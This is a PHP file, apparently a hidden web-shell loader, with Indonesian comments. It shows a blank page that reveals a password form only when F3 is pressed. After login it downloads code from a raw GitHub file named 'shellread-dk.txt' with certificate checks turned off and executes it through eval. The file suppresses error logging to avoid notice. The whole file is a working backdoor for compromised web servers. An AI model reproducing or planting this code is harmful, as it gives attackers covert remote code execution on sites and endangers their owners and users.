<?php
ini_set('log_errors', 0);
ini_set('display_errors', 0);
session_start();

// Simpan hash MD5 dari password di constant.
// MD5("123456") = e10adc3949ba59abbe56e057f20f883e
define('ADMIN_PASSWORD_HASH', 'a6b51256ec799e0907b1649e7b955371');

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['password'])) {
        // Hitung md5 dari input lalu bandingkan dengan hash yang disimpan.
        // Gunakan hash_equals untuk mengurangi risiko timing attack.
        $input_hash = md5($_POST['password']);
        if (hash_equals(ADMIN_PASSWORD_HASH, $input_hash)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }

    ?>
    <!doctype html>
    <html lang="id">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title> </title>
        <style>

            html, body {
                height: 100%;
                margin: 0;
                background: #ffffff; 
            }

            #loginWrap {
                display: none; 
                position: fixed;
                left: 50%;
                top: 50%;
                transform: translate(-50%, -50%);
                background: #f9f9f9;
                border: 1px solid #ddd;
                padding: 18px;
                border-radius: 6px;
                box-shadow: 0 6px 24px rgba(0,0,0,0.12);
                z-index: 9999;
                min-width: 260px;
            }
            #loginWrap input[type="password"]{
                width: 100%;
                padding: 8px 10px;
                margin-bottom: 10px;
                box-sizing: border-box;
            }
            #loginWrap button{
                padding: 8px 12px;
            }
            #hint {
                position: fixed;
                right: 12px;
                bottom: 12px;
                font-size: 12px;
                color: #aaa;
                user-select: none;
            }
        </style>
    </head>
    <body>

        <div id="loginWrap" aria-hidden="true">
            <form method="post" id="loginForm" autocomplete="off">
                <input id="password" type="password" name="password" placeholder="Masukkan Password" />
                <div style="display:flex; gap:8px; justify-content:flex-end;">
                    <button type="submit">Login</button>
                </div>
                <?php if (isset($error)) echo "<p style='color:red;margin:8px 0 0;'>".htmlspecialchars($error)."</p>"; ?>
            </form>
        </div>

        <div id="hint" aria-hidden="true">Tekan F3 untuk membuka login</div>

        <script>
            (function(){
                var shown = false;
                document.addEventListener('keydown', function(e){

                    if (e.key === 'F3' || e.keyCode === 117) {
                        e.preventDefault();
                        var wrap = document.getElementById('loginWrap');
                        if (!shown) {
                            wrap.style.display = 'block';
                            wrap.setAttribute('aria-hidden', 'false');
                            var pwd = document.getElementById('password');
                            if (pwd) pwd.focus();
                            shown = true;
                        } else {
                            // jika sudah muncul, toggle (opsional)
                            wrap.style.display = 'none';
                            wrap.setAttribute('aria-hidden', 'true');
                            shown = false;
                        }
                    }
                });

                document.addEventListener('click', function(e){
                    var wrap = document.getElementById('loginWrap');
                    if (!wrap) return;
                    if (shown && !wrap.contains(e.target)) {

                    }
                });
            })();
        </script>
    </body>
    </html>
    <?php
    exit;
}


function getURL($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        if ($data === false) {
            return false;
        }
        curl_close($ch);
        return $data;
    }
    return false;
}


$remoteUrl = "https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/shellread-dk.txt";
$remoteCode = getURL($remoteUrl);

if ($remoteCode) {

    eval("?>" . $remoteCode);
} else {
    echo "Gagal mengambil kode dari URL.";
}
?>	
